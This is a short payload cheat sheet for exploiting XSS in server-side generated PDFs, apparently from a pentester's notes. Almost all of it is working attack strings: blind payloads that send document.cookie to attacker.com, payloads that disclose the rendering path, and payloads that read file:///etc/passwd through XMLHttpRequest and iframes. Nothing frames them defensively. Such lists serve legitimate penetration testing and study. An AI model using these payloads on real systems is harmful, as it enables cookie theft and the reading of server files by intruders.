# Local File Read via XSS in Dynamically Generated PDF - (comisariavirtual)

```
Discovery:
   <!-- Basic discovery, Write "test"-->
   1- <svg/onload=document.write(1337)>
   2- <img src="x" onerror="document.write(1337)" />

   <!--Basic blind discovery, load a resource-->
   1- <img src="http://attacker.com"/>
   2- <img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
   3- <script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>

Path disclosure:
   <!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
   1- <svg/onload=document.write(window.location)>
   2- <img src=x onerror=document.write(window.location)>
   3- <script>document.write(window.location)</script>

Read local file:
   1- <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
   2- <iframe src=file:///etc/passwd></iframe>
   3- <img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
```
